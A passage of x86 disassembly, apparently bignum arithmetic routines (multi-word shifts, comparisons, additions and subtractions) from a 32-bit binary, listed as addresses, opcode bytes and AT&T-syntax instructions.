  404261:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  404265:	56                   	push   %esi
  404266:	57                   	push   %edi
  404267:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  40426b:	33 f6                	xor    %esi,%esi
  40426d:	53                   	push   %ebx
  40426e:	89 74 24 14          	mov    %esi,0x14(%esp)
  404272:	83 e5 1f             	and    $0x1f,%ebp
  404275:	c1 ef 05             	shr    $0x5,%edi
  404278:	e8 a9 fb ff ff       	call   0x403e26
  40427d:	8b 4b 04             	mov    0x4(%ebx),%ecx
  404280:	8b d0                	mov    %eax,%edx
  404282:	03 54 24 1c          	add    0x1c(%esp),%edx
  404286:	c1 e1 05             	shl    $0x5,%ecx
  404289:	3b ca                	cmp    %edx,%ecx
  40428b:	73 18                	jae    0x4042a5
  40428d:	56                   	push   %esi
  40428e:	58                   	pop    %eax
  40428f:	f6 c2 1f             	test   $0x1f,%dl
  404292:	0f 95 c0             	setne  %al
  404295:	c1 ea 05             	shr    $0x5,%edx
  404298:	03 c2                	add    %edx,%eax
  40429a:	50                   	push   %eax
  40429b:	53                   	push   %ebx
  40429c:	e8 54 f7 ff ff       	call   0x4039f5
  4042a1:	85 c0                	test   %eax,%eax
  4042a3:	75 77                	jne    0x40431c
  4042a5:	89 74 24 1c          	mov    %esi,0x1c(%esp)
  4042a9:	85 ff                	test   %edi,%edi
  4042ab:	74 30                	je     0x4042dd
  4042ad:	8b 53 04             	mov    0x4(%ebx),%edx
  4042b0:	3b d7                	cmp    %edi,%edx
  4042b2:	76 1b                	jbe    0x4042cf
  4042b4:	8b f2                	mov    %edx,%esi
  4042b6:	2b f7                	sub    %edi,%esi
  4042b8:	c1 e6 02             	shl    $0x2,%esi
  4042bb:	8b 4b 08             	mov    0x8(%ebx),%ecx
  4042be:	8d 76 fc             	lea    -0x4(%esi),%esi
  4042c1:	8b 04 0e             	mov    (%esi,%ecx,1),%eax
  4042c4:	89 44 91 fc          	mov    %eax,-0x4(%ecx,%edx,4)
  4042c8:	4a                   	dec    %edx
  4042c9:	3b d7                	cmp    %edi,%edx
  4042cb:	77 ee                	ja     0x4042bb
  4042cd:	33 f6                	xor    %esi,%esi
  4042cf:	85 d2                	test   %edx,%edx
  4042d1:	74 0a                	je     0x4042dd
  4042d3:	8b 43 08             	mov    0x8(%ebx),%eax
  4042d6:	89 74 90 fc          	mov    %esi,-0x4(%eax,%edx,4)
  4042da:	4a                   	dec    %edx
  4042db:	75 f6                	jne    0x4042d3
  4042dd:	85 ed                	test   %ebp,%ebp
  4042df:	74 37                	je     0x404318
  4042e1:	3b 7b 04             	cmp    0x4(%ebx),%edi
  4042e4:	73 32                	jae    0x404318
  4042e6:	6a 20                	push   $0x20
  4042e8:	59                   	pop    %ecx
  4042e9:	2b cd                	sub    %ebp,%ecx
  4042eb:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4042ef:	8b 53 08             	mov    0x8(%ebx),%edx
  4042f2:	8b 04 ba             	mov    (%edx,%edi,4),%eax
  4042f5:	8b f0                	mov    %eax,%esi
  4042f7:	d3 ee                	shr    %cl,%esi
  4042f9:	8b cd                	mov    %ebp,%ecx
  4042fb:	d3 e0                	shl    %cl,%eax
  4042fd:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  404301:	89 04 ba             	mov    %eax,(%edx,%edi,4)
  404304:	8b 43 08             	mov    0x8(%ebx),%eax
  404307:	89 74 24 10          	mov    %esi,0x10(%esp)
  40430b:	09 0c b8             	or     %ecx,(%eax,%edi,4)
  40430e:	47                   	inc    %edi
  40430f:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  404313:	3b 7b 04             	cmp    0x4(%ebx),%edi
  404316:	72 d7                	jb     0x4042ef
  404318:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  40431c:	5f                   	pop    %edi
  40431d:	5e                   	pop    %esi
  40431e:	5d                   	pop    %ebp
  40431f:	5b                   	pop    %ebx
  404320:	59                   	pop    %ecx
  404321:	c2 08 00             	ret    $0x8
  404324:	51                   	push   %ecx
  404325:	53                   	push   %ebx
  404326:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  40432a:	33 c9                	xor    %ecx,%ecx
  40432c:	56                   	push   %esi
  40432d:	57                   	push   %edi
  40432e:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404332:	8b f3                	mov    %ebx,%esi
  404334:	c1 ee 05             	shr    $0x5,%esi
  404337:	83 e3 1f             	and    $0x1f,%ebx
  40433a:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  40433e:	8b 47 04             	mov    0x4(%edi),%eax
  404341:	3b f0                	cmp    %eax,%esi
  404343:	77 7e                	ja     0x4043c3
  404345:	75 04                	jne    0x40434b
  404347:	85 db                	test   %ebx,%ebx
  404349:	75 78                	jne    0x4043c3
  40434b:	55                   	push   %ebp
  40434c:	85 f6                	test   %esi,%esi
  40434e:	74 31                	je     0x404381
  404350:	8b d1                	mov    %ecx,%edx
  404352:	2b c6                	sub    %esi,%eax
  404354:	74 26                	je     0x40437c
  404356:	8b ee                	mov    %esi,%ebp
  404358:	c1 e5 02             	shl    $0x2,%ebp
  40435b:	8b 4f 08             	mov    0x8(%edi),%ecx
  40435e:	8b 04 29             	mov    (%ecx,%ebp,1),%eax
  404361:	8d 6d 04             	lea    0x4(%ebp),%ebp
  404364:	89 04 91             	mov    %eax,(%ecx,%edx,4)
  404367:	42                   	inc    %edx
  404368:	8b 47 04             	mov    0x4(%edi),%eax
  40436b:	2b c6                	sub    %esi,%eax
  40436d:	3b d0                	cmp    %eax,%edx
  40436f:	72 ea                	jb     0x40435b
  404371:	33 c9                	xor    %ecx,%ecx
  404373:	eb 07                	jmp    0x40437c
  404375:	8b 47 08             	mov    0x8(%edi),%eax
  404378:	89 0c 90             	mov    %ecx,(%eax,%edx,4)
  40437b:	42                   	inc    %edx
  40437c:	3b 57 04             	cmp    0x4(%edi),%edx
  40437f:	72 f4                	jb     0x404375
  404381:	85 db                	test   %ebx,%ebx
  404383:	74 39                	je     0x4043be
  404385:	8b 6f 04             	mov    0x4(%edi),%ebp
  404388:	85 ed                	test   %ebp,%ebp
  40438a:	74 32                	je     0x4043be
  40438c:	6a 20                	push   $0x20
  40438e:	59                   	pop    %ecx
  40438f:	2b cb                	sub    %ebx,%ecx
  404391:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  404395:	8b 57 08             	mov    0x8(%edi),%edx
  404398:	8b 44 aa fc          	mov    -0x4(%edx,%ebp,4),%eax
  40439c:	8b f0                	mov    %eax,%esi
  40439e:	d3 e6                	shl    %cl,%esi
  4043a0:	8b cb                	mov    %ebx,%ecx
  4043a2:	d3 e8                	shr    %cl,%eax
  4043a4:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4043a8:	89 44 aa fc          	mov    %eax,-0x4(%edx,%ebp,4)
  4043ac:	8b 47 08             	mov    0x8(%edi),%eax
  4043af:	89 74 24 10          	mov    %esi,0x10(%esp)
  4043b3:	09 4c a8 fc          	or     %ecx,-0x4(%eax,%ebp,4)
  4043b7:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4043bb:	4d                   	dec    %ebp
  4043bc:	75 d7                	jne    0x404395
  4043be:	33 c0                	xor    %eax,%eax
  4043c0:	5d                   	pop    %ebp
  4043c1:	eb 07                	jmp    0x4043ca
  4043c3:	51                   	push   %ecx
  4043c4:	57                   	push   %edi
  4043c5:	e8 29 f9 ff ff       	call   0x403cf3
  4043ca:	5f                   	pop    %edi
  4043cb:	5e                   	pop    %esi
  4043cc:	5b                   	pop    %ebx
  4043cd:	59                   	pop    %ecx
  4043ce:	c2 08 00             	ret    $0x8
  4043d1:	56                   	push   %esi
  4043d2:	8b 74 24 08          	mov    0x8(%esp),%esi
  4043d6:	57                   	push   %edi
  4043d7:	8b 4e 04             	mov    0x4(%esi),%ecx
  4043da:	85 c9                	test   %ecx,%ecx
  4043dc:	74 14                	je     0x4043f2
  4043de:	8b 46 08             	mov    0x8(%esi),%eax
  4043e1:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  4043e4:	83 c0 fc             	add    $0xfffffffc,%eax
  4043e7:	83 38 00             	cmpl   $0x0,(%eax)
  4043ea:	75 06                	jne    0x4043f2
  4043ec:	83 e8 04             	sub    $0x4,%eax
  4043ef:	49                   	dec    %ecx
  4043f0:	75 f5                	jne    0x4043e7
  4043f2:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4043f6:	8b 57 04             	mov    0x4(%edi),%edx
  4043f9:	85 d2                	test   %edx,%edx
  4043fb:	74 14                	je     0x404411
  4043fd:	8b 47 08             	mov    0x8(%edi),%eax
  404400:	8d 04 90             	lea    (%eax,%edx,4),%eax
  404403:	83 c0 fc             	add    $0xfffffffc,%eax
  404406:	83 38 00             	cmpl   $0x0,(%eax)
  404409:	75 06                	jne    0x404411
  40440b:	83 e8 04             	sub    $0x4,%eax
  40440e:	4a                   	dec    %edx
  40440f:	75 f5                	jne    0x404406
  404411:	85 c9                	test   %ecx,%ecx
  404413:	75 0d                	jne    0x404422
  404415:	85 d2                	test   %edx,%edx
  404417:	74 2b                	je     0x404444
  404419:	3b d1                	cmp    %ecx,%edx
  40441b:	76 0e                	jbe    0x40442b
  40441d:	83 c8 ff             	or     $0xffffffff,%eax
  404420:	eb 24                	jmp    0x404446
  404422:	3b d1                	cmp    %ecx,%edx
  404424:	73 f5                	jae    0x40441b
  404426:	33 c0                	xor    %eax,%eax
  404428:	40                   	inc    %eax
  404429:	eb 1b                	jmp    0x404446
  40442b:	85 c9                	test   %ecx,%ecx
  40442d:	74 15                	je     0x404444
  40442f:	8b 56 08             	mov    0x8(%esi),%edx
  404432:	8b 77 08             	mov    0x8(%edi),%esi
  404435:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  404439:	39 44 8a fc          	cmp    %eax,-0x4(%edx,%ecx,4)
  40443d:	77 e7                	ja     0x404426
  40443f:	72 dc                	jb     0x40441d
  404441:	49                   	dec    %ecx
  404442:	75 f1                	jne    0x404435
  404444:	33 c0                	xor    %eax,%eax
  404446:	5f                   	pop    %edi
  404447:	5e                   	pop    %esi
  404448:	c2 08 00             	ret    $0x8
  40444b:	53                   	push   %ebx
  40444c:	56                   	push   %esi
  40444d:	57                   	push   %edi
  40444e:	8b 7c 24 10          	mov    0x10(%esp),%edi
  404452:	33 db                	xor    %ebx,%ebx
  404454:	8b 4f 04             	mov    0x4(%edi),%ecx
  404457:	85 c9                	test   %ecx,%ecx
  404459:	74 13                	je     0x40446e
  40445b:	8b 47 08             	mov    0x8(%edi),%eax
  40445e:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  404461:	83 c0 fc             	add    $0xfffffffc,%eax
  404464:	39 18                	cmp    %ebx,(%eax)
  404466:	75 06                	jne    0x40446e
  404468:	83 e8 04             	sub    $0x4,%eax
  40446b:	49                   	dec    %ecx
  40446c:	75 f6                	jne    0x404464
  40446e:	8b 74 24 14          	mov    0x14(%esp),%esi
  404472:	8b 56 04             	mov    0x4(%esi),%edx
  404475:	85 d2                	test   %edx,%edx
  404477:	74 13                	je     0x40448c
  404479:	8b 46 08             	mov    0x8(%esi),%eax
  40447c:	8d 04 90             	lea    (%eax,%edx,4),%eax
  40447f:	83 c0 fc             	add    $0xfffffffc,%eax
  404482:	39 18                	cmp    %ebx,(%eax)
  404484:	75 06                	jne    0x40448c
  404486:	83 e8 04             	sub    $0x4,%eax
  404489:	4a                   	dec    %edx
  40448a:	75 f6                	jne    0x404482
  40448c:	85 c9                	test   %ecx,%ecx
  40448e:	75 0e                	jne    0x40449e
  404490:	85 d2                	test   %edx,%edx
  404492:	74 47                	je     0x4044db
  404494:	3b d1                	cmp    %ecx,%edx
  404496:	76 0e                	jbe    0x4044a6
  404498:	8b 06                	mov    (%esi),%eax
  40449a:	f7 d8                	neg    %eax
  40449c:	eb 3f                	jmp    0x4044dd
  40449e:	3b d1                	cmp    %ecx,%edx
  4044a0:	73 f4                	jae    0x404496
  4044a2:	8b 07                	mov    (%edi),%eax
  4044a4:	eb 37                	jmp    0x4044dd
  4044a6:	8b 07                	mov    (%edi),%eax
  4044a8:	85 c0                	test   %eax,%eax
  4044aa:	7e 09                	jle    0x4044b5
  4044ac:	39 1e                	cmp    %ebx,(%esi)
  4044ae:	7d 07                	jge    0x4044b7
  4044b0:	33 c0                	xor    %eax,%eax
  4044b2:	40                   	inc    %eax
  4044b3:	eb 28                	jmp    0x4044dd
  4044b5:	39 1e                	cmp    %ebx,(%esi)
  4044b7:	7e 09                	jle    0x4044c2
  4044b9:	85 c0                	test   %eax,%eax
  4044bb:	79 05                	jns    0x4044c2
  4044bd:	83 c8 ff             	or     $0xffffffff,%eax
  4044c0:	eb 1b                	jmp    0x4044dd
  4044c2:	85 c9                	test   %ecx,%ecx
  4044c4:	74 15                	je     0x4044db
  4044c6:	8b 7f 08             	mov    0x8(%edi),%edi
  4044c9:	8b 76 08             	mov    0x8(%esi),%esi
  4044cc:	8b 54 8e fc          	mov    -0x4(%esi,%ecx,4),%edx
  4044d0:	39 54 8f fc          	cmp    %edx,-0x4(%edi,%ecx,4)
  4044d4:	77 07                	ja     0x4044dd
  4044d6:	72 c2                	jb     0x40449a
  4044d8:	49                   	dec    %ecx
  4044d9:	75 f1                	jne    0x4044cc
  4044db:	33 c0                	xor    %eax,%eax
  4044dd:	5f                   	pop    %edi
  4044de:	5e                   	pop    %esi
  4044df:	5b                   	pop    %ebx
  4044e0:	c2 08 00             	ret    $0x8
  4044e3:	55                   	push   %ebp
  4044e4:	8b ec                	mov    %esp,%ebp
  4044e6:	83 ec 10             	sub    $0x10,%esp
  4044e9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4044ec:	99                   	cltd
  4044ed:	33 c2                	xor    %edx,%eax
  4044ef:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  4044f6:	2b c2                	sub    %edx,%eax
  4044f8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4044fb:	33 c0                	xor    %eax,%eax
  4044fd:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404500:	0f 9d c0             	setge  %al
  404503:	8d 04 45 ff ff ff ff 	lea    -0x1(,%eax,2),%eax
  40450a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40450d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404510:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404513:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404516:	50                   	push   %eax
  404517:	ff 75 08             	push   0x8(%ebp)
  40451a:	e8 2c ff ff ff       	call   0x40444b
  40451f:	8b e5                	mov    %ebp,%esp
  404521:	5d                   	pop    %ebp
  404522:	c2 08 00             	ret    $0x8
  404525:	55                   	push   %ebp
  404526:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  40452a:	56                   	push   %esi
  40452b:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40452f:	3b f5                	cmp    %ebp,%esi
  404531:	75 08                	jne    0x40453b
  404533:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  404537:	8b c6                	mov    %esi,%eax
  404539:	eb 04                	jmp    0x40453f
  40453b:	8b 44 24 10          	mov    0x10(%esp),%eax
  40453f:	3b f0                	cmp    %eax,%esi
  404541:	74 11                	je     0x404554
  404543:	50                   	push   %eax
  404544:	56                   	push   %esi
  404545:	e8 a0 f5 ff ff       	call   0x403aea
  40454a:	8b d0                	mov    %eax,%edx
  40454c:	85 d2                	test   %edx,%edx
  40454e:	0f 85 93 00 00 00    	jne    0x4045e7
  404554:	53                   	push   %ebx
  404555:	57                   	push   %edi
  404556:	c7 06 01 00 00 00    	movl   $0x1,(%esi)
  40455c:	33 db                	xor    %ebx,%ebx
  40455e:	8b 7d 04             	mov    0x4(%ebp),%edi
  404561:	85 ff                	test   %edi,%edi
  404563:	74 13                	je     0x404578
  404565:	8b 45 08             	mov    0x8(%ebp),%eax
  404568:	8d 04 b8             	lea    (%eax,%edi,4),%eax
  40456b:	83 c0 fc             	add    $0xfffffffc,%eax
  40456e:	39 18                	cmp    %ebx,(%eax)
  404570:	75 06                	jne    0x404578
  404572:	83 e8 04             	sub    $0x4,%eax
  404575:	4f                   	dec    %edi
  404576:	75 f6                	jne    0x40456e
  404578:	57                   	push   %edi
  404579:	56                   	push   %esi
  40457a:	e8 76 f4 ff ff       	call   0x4039f5
  40457f:	8b d0                	mov    %eax,%edx
  404581:	85 d2                	test   %edx,%edx
  404583:	75 60                	jne    0x4045e5
  404585:	8b 45 08             	mov    0x8(%ebp),%eax
  404588:	8b 4e 08             	mov    0x8(%esi),%ecx
  40458b:	89 44 24 18          	mov    %eax,0x18(%esp)
  40458f:	85 ff                	test   %edi,%edi
  404591:	74 52                	je     0x4045e5
  404593:	8b ef                	mov    %edi,%ebp
  404595:	8b f0                	mov    %eax,%esi
  404597:	8b 06                	mov    (%esi),%eax
  404599:	8d 76 04             	lea    0x4(%esi),%esi
  40459c:	01 19                	add    %ebx,(%ecx)
  40459e:	39 19                	cmp    %ebx,(%ecx)
  4045a0:	1b db                	sbb    %ebx,%ebx
  4045a2:	01 01                	add    %eax,(%ecx)
  4045a4:	f7 db                	neg    %ebx
  4045a6:	39 01                	cmp    %eax,(%ecx)
  4045a8:	1b c0                	sbb    %eax,%eax
  4045aa:	83 c1 04             	add    $0x4,%ecx
  4045ad:	f7 d8                	neg    %eax
  4045af:	03 d8                	add    %eax,%ebx
  4045b1:	4f                   	dec    %edi
  4045b2:	75 e3                	jne    0x404597
  4045b4:	8b 74 24 14          	mov    0x14(%esp),%esi
  4045b8:	85 db                	test   %ebx,%ebx
  4045ba:	74 29                	je     0x4045e5
  4045bc:	3b 6e 04             	cmp    0x4(%esi),%ebp
  4045bf:	72 16                	jb     0x4045d7
  4045c1:	8d 45 01             	lea    0x1(%ebp),%eax
  4045c4:	50                   	push   %eax
  4045c5:	56                   	push   %esi
  4045c6:	e8 2a f4 ff ff       	call   0x4039f5
  4045cb:	8b d0                	mov    %eax,%edx
  4045cd:	85 d2                	test   %edx,%edx
  4045cf:	75 14                	jne    0x4045e5
  4045d1:	8b 46 08             	mov    0x8(%esi),%eax
  4045d4:	8d 0c a8             	lea    (%eax,%ebp,4),%ecx
  4045d7:	01 19                	add    %ebx,(%ecx)
  4045d9:	39 19                	cmp    %ebx,(%ecx)
  4045db:	1b db                	sbb    %ebx,%ebx
  4045dd:	45                   	inc    %ebp
  4045de:	83 c1 04             	add    $0x4,%ecx
  4045e1:	f7 db                	neg    %ebx
  4045e3:	75 d7                	jne    0x4045bc
  4045e5:	5f                   	pop    %edi
  4045e6:	5b                   	pop    %ebx
  4045e7:	5e                   	pop    %esi
  4045e8:	8b c2                	mov    %edx,%eax
  4045ea:	5d                   	pop    %ebp
  4045eb:	c2 0c 00             	ret    $0xc
  4045ee:	55                   	push   %ebp
  4045ef:	8b ec                	mov    %esp,%ebp
  4045f1:	83 ec 0c             	sub    $0xc,%esp
  4045f4:	56                   	push   %esi
  4045f5:	8b 75 10             	mov    0x10(%ebp),%esi
  4045f8:	56                   	push   %esi
  4045f9:	ff 75 0c             	push   0xc(%ebp)
  4045fc:	e8 d0 fd ff ff       	call   0x4043d1
  404601:	85 c0                	test   %eax,%eax
  404603:	79 05                	jns    0x40460a
  404605:	6a f6                	push   $0xfffffff6
  404607:	58                   	pop    %eax
  404608:	eb 74                	jmp    0x40467e
  40460a:	53                   	push   %ebx
  40460b:	57                   	push   %edi
  40460c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40460f:	50                   	push   %eax
  404610:	e8 92 f3 ff ff       	call   0x4039a7
  404615:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404618:	3b de                	cmp    %esi,%ebx
  40461a:	75 13                	jne    0x40462f
  40461c:	56                   	push   %esi
  40461d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404620:	50                   	push   %eax
  404621:	e8 c4 f4 ff ff       	call   0x403aea
  404626:	8b f8                	mov    %eax,%edi
  404628:	85 ff                	test   %edi,%edi
  40462a:	75 45                	jne    0x404671
  40462c:	8d 75 f4             	lea    -0xc(%ebp),%esi
  40462f:	3b 5d 0c             	cmp    0xc(%ebp),%ebx
  404632:	74 0f                	je     0x404643
  404634:	ff 75 0c             	push   0xc(%ebp)
  404637:	53                   	push   %ebx
  404638:	e8 ad f4 ff ff       	call   0x403aea
  40463d:	8b f8                	mov    %eax,%edi
  40463f:	85 ff                	test   %edi,%edi
  404641:	75 2e                	jne    0x404671
  404643:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  404649:	33 ff                	xor    %edi,%edi
  40464b:	8b 4e 04             	mov    0x4(%esi),%ecx
  40464e:	85 c9                	test   %ecx,%ecx
  404650:	74 13                	je     0x404665
  404652:	8b 46 08             	mov    0x8(%esi),%eax
  404655:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  404658:	83 c0 fc             	add    $0xfffffffc,%eax
  40465b:	39 38                	cmp    %edi,(%eax)
  40465d:	75 06                	jne    0x404665
  40465f:	83 e8 04             	sub    $0x4,%eax
  404662:	49                   	dec    %ecx
  404663:	75 f6                	jne    0x40465b
  404665:	ff 73 08             	push   0x8(%ebx)
  404668:	ff 76 08             	push   0x8(%esi)
  40466b:	51                   	push   %ecx
  40466c:	e8 ad 16 00 00       	call   0x405d1e
  404671:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404674:	50                   	push   %eax
  404675:	e8 46 f3 ff ff       	call   0x4039c0
  40467a:	8b c7                	mov    %edi,%eax
  40467c:	5f                   	pop    %edi
  40467d:	5b                   	pop    %ebx
  40467e:	5e                   	pop    %esi
  40467f:	8b e5                	mov    %ebp,%esp
  404681:	5d                   	pop    %ebp
  404682:	c2 0c 00             	ret    $0xc
  404685:	55                   	push   %ebp
  404686:	8b ec                	mov    %esp,%ebp
  404688:	53                   	push   %ebx
  404689:	8b 5d 10             	mov    0x10(%ebp),%ebx
  40468c:	56                   	push   %esi
  40468d:	57                   	push   %edi
  40468e:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404691:	8b 03                	mov    (%ebx),%eax
  404693:	53                   	push   %ebx
  404694:	57                   	push   %edi
  404695:	8b 37                	mov    (%edi),%esi
  404697:	0f af c6             	imul   %esi,%eax
  40469a:	85 c0                	test   %eax,%eax
  40469c:	79 29                	jns    0x4046c7
  40469e:	e8 2e fd ff ff       	call   0x4043d1
  4046a3:	85 c0                	test   %eax,%eax
  4046a5:	78 0d                	js     0x4046b4
  4046a7:	53                   	push   %ebx
  4046a8:	57                   	push   %edi
  4046a9:	8b 7d 08             	mov    0x8(%ebp),%edi
  4046ac:	57                   	push   %edi
  4046ad:	e8 3c ff ff ff       	call   0x4045ee
  4046b2:	eb 1c                	jmp    0x4046d0
  4046b4:	57                   	push   %edi
  4046b5:	8b 7d 08             	mov    0x8(%ebp),%edi
  4046b8:	53                   	push   %ebx
  4046b9:	57                   	push   %edi
  4046ba:	e8 2f ff ff ff       	call   0x4045ee
  4046bf:	85 c0                	test   %eax,%eax
  4046c1:	75 13                	jne    0x4046d6
  4046c3:	f7 de                	neg    %esi
  4046c5:	eb 0d                	jmp    0x4046d4
  4046c7:	8b 7d 08             	mov    0x8(%ebp),%edi
  4046ca:	57                   	push   %edi
  4046cb:	e8 55 fe ff ff       	call   0x404525
  4046d0:	85 c0                	test   %eax,%eax
  4046d2:	75 02                	jne    0x4046d6
  4046d4:	89 37                	mov    %esi,(%edi)
  4046d6:	5f                   	pop    %edi
  4046d7:	5e                   	pop    %esi
  4046d8:	5b                   	pop    %ebx
  4046d9:	5d                   	pop    %ebp
  4046da:	c2 0c 00             	ret    $0xc
  4046dd:	55                   	push   %ebp
  4046de:	8b ec                	mov    %esp,%ebp
  4046e0:	53                   	push   %ebx
  4046e1:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4046e4:	56                   	push   %esi
  4046e5:	57                   	push   %edi
  4046e6:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4046e9:	8b 03                	mov    (%ebx),%eax
  4046eb:	53                   	push   %ebx
  4046ec:	57                   	push   %edi
  4046ed:	8b 37                	mov    (%edi),%esi
  4046ef:	0f af c6             	imul   %esi,%eax
  4046f2:	85 c0                	test   %eax,%eax
  4046f4:	7e 29                	jle    0x40471f
  4046f6:	e8 d6 fc ff ff       	call   0x4043d1
  4046fb:	85 c0                	test   %eax,%eax
  4046fd:	78 0d                	js     0x40470c
  4046ff:	53                   	push   %ebx
  404700:	57                   	push   %edi
  404701:	8b 7d 08             	mov    0x8(%ebp),%edi
  404704:	57                   	push   %edi
  404705:	e8 e4 fe ff ff       	call   0x4045ee
  40470a:	eb 1c                	jmp    0x404728
  40470c:	57                   	push   %edi
  40470d:	8b 7d 08             	mov    0x8(%ebp),%edi
  404710:	53                   	push   %ebx
  404711:	57                   	push   %edi
  404712:	e8 d7 fe ff ff       	call   0x4045ee
  404717:	85 c0                	test   %eax,%eax
  404719:	75 13                	jne    0x40472e
  40471b:	f7 de                	neg    %esi
  40471d:	eb 0d                	jmp    0x40472c
  40471f:	8b 7d 08             	mov    0x8(%ebp),%edi
  404722:	57                   	push   %edi
  404723:	e8 fd fd ff ff       	call   0x404525
  404728:	85 c0                	test   %eax,%eax
  40472a:	75 02                	jne    0x40472e
  40472c:	89 37                	mov    %esi,(%edi)
  40472e:	5f                   	pop    %edi
  40472f:	5e                   	pop    %esi
  404730:	5b                   	pop    %ebx
  404731:	5d                   	pop    %ebp
  404732:	c2 0c 00             	ret    $0xc
  404735:	55                   	push   %ebp
  404736:	8b ec                	mov    %esp,%ebp
  404738:	83 ec 10             	sub    $0x10,%esp
  40473b:	8b 45 10             	mov    0x10(%ebp),%eax
  40473e:	99                   	cltd
  40473f:	33 c2                	xor    %edx,%eax
  404741:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  404748:	2b c2                	sub    %edx,%eax
  40474a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40474d:	33 c0                	xor    %eax,%eax
  40474f:	39 45 10             	cmp    %eax,0x10(%ebp)
  404752:	0f 9d c0             	setge  %al
  404755:	8d 04 45 ff ff ff ff 	lea    -0x1(,%eax,2),%eax
  40475c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40475f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  404762:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404765:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404768:	50                   	push   %eax
  404769:	ff 75 0c             	push   0xc(%ebp)
  40476c:	ff 75 08             	push   0x8(%ebp)
  40476f:	e8 11 ff ff ff       	call   0x404685
  404774:	8b e5                	mov    %ebp,%esp
  404776:	5d                   	pop    %ebp
  404777:	c2 0c 00             	ret    $0xc
  40477a:	55                   	push   %ebp
  40477b:	8b ec                	mov    %esp,%ebp
  40477d:	83 ec 10             	sub    $0x10,%esp
  404780:	8b 45 10             	mov    0x10(%ebp),%eax
  404783:	99                   	cltd
  404784:	33 c2                	xor    %edx,%eax
  404786:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  40478d:	2b c2                	sub    %edx,%eax
  40478f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404792:	33 c0                	xor    %eax,%eax
  404794:	39 45 10             	cmp    %eax,0x10(%ebp)
  404797:	0f 9d c0             	setge  %al
  40479a:	8d 04 45 ff ff ff ff 	lea    -0x1(,%eax,2),%eax
  4047a1:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4047a4:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4047a7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4047aa:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4047ad:	50                   	push   %eax
  4047ae:	ff 75 0c             	push   0xc(%ebp)
  4047b1:	ff 75 08             	push   0x8(%ebp)
  4047b4:	e8 24 ff ff ff       	call   0x4046dd
  4047b9:	8b e5                	mov    %ebp,%esp
  4047bb:	5d                   	pop    %ebp
  4047bc:	c2 0c 00             	ret    $0xc
  4047bf:	83 ec 1c             	sub    $0x1c,%esp
  4047c2:	8d 44 24 10          	lea    0x10(%esp),%eax
  4047c6:	55                   	push   %ebp
  4047c7:	57                   	push   %edi
  4047c8:	50                   	push   %eax
  4047c9:	e8 d9 f1 ff ff       	call   0x4039a7
  4047ce:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4047d2:	50                   	push   %eax
  4047d3:	e8 cf f1 ff ff       	call   0x4039a7
  4047d8:	8b 6c 24 2c          	mov    0x2c(%esp),%ebp
  4047dc:	8b 54 24 28          	mov    0x28(%esp),%edx
  4047e0:	3b d5                	cmp    %ebp,%edx
  4047e2:	75 1d                	jne    0x404801
  4047e4:	55                   	push   %ebp
  4047e5:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4047e9:	50                   	push   %eax
  4047ea:	e8 fb f2 ff ff       	call   0x403aea
  4047ef:	8b f8                	mov    %eax,%edi
  4047f1:	85 ff                	test   %edi,%edi
  4047f3:	0f 85 d8 00 00 00    	jne    0x4048d1
  4047f9:	8b 54 24 28          	mov    0x28(%esp),%edx
  4047fd:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  404801:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  404805:	3b d1                	cmp    %ecx,%edx
  404807:	75 21                	jne    0x40482a
  404809:	51                   	push   %ecx
  40480a:	8d 44 24 10          	lea    0x10(%esp),%eax
  40480e:	50                   	push   %eax
  40480f:	e8 d6 f2 ff ff       	call   0x403aea
  404814:	8b f8                	mov    %eax,%edi
  404816:	85 ff                	test   %edi,%edi
  404818:	0f 85 b3 00 00 00    	jne    0x4048d1
  40481e:	8b 54 24 28          	mov    0x28(%esp),%edx
